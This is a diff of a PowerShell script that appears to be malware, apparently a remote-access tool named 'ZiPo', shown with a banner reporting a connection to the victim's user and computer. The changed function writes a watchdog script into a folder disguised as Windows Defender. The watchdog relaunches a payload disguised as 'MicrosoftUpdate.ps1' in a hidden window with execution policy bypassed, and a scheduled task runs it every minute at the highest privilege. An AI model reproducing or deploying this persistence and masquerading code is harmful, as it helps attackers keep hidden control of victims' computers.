@@ -410,33 +410,24 @@ try {
 
 function Register-SelfWatchTask {
     $taskName = "ZiPo_SelfWatch"
-    $basePath = "$env:APPDATA\WindowsDefender"
-    $watchScriptPath = Join-Path $basePath "watchdog.ps1"
-    $targetScript = Join-Path $basePath "MicrosoftUpdate.ps1"
-    $logPath = Join-Path $basePath "watchdog.log"
+    $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
 
     $watchScript = @"
-# Watchdog run: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-Add-Content -Path '$logPath' -Value '[*] Watchdog run: $(Get-Date)'
-\$path = '$targetScript'
+Add-Content -Path "`"$env:APPDATA\WindowsDefender\watchdog.log`"" -Value "`"[*] Watchdog run: \$(Get-Date)`"
+\$path = `"$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1`"
 \$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
 if (-not \$running) {
-    Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
+    Start-Process powershell.exe "`"-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`"`"
 }
 "@
 
-    # Сохраняем watchdog рядом с основным скриптом
-    $watchScript | Out-File -FilePath $watchScriptPath -Encoding UTF8 -Force
+    $watchScript | Set-Content -Path $watchScriptPath -Encoding UTF8 -Force
 
-    # Удаляем старую задачу, если она есть
     schtasks /Delete /TN $taskName /F > $null 2>&1
-
-    # Создаём новую задачу: каждую минуту
     schtasks /Create /TN $taskName /SC MINUTE /MO 1 `
         /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchScriptPath`"" `
         /RL HIGHEST /F | Out-Null
 }
-
 
 
 
@@ -716,7 +707,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            GAYqqwfggw                                                                                                                                                                   
+                                            G455q                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
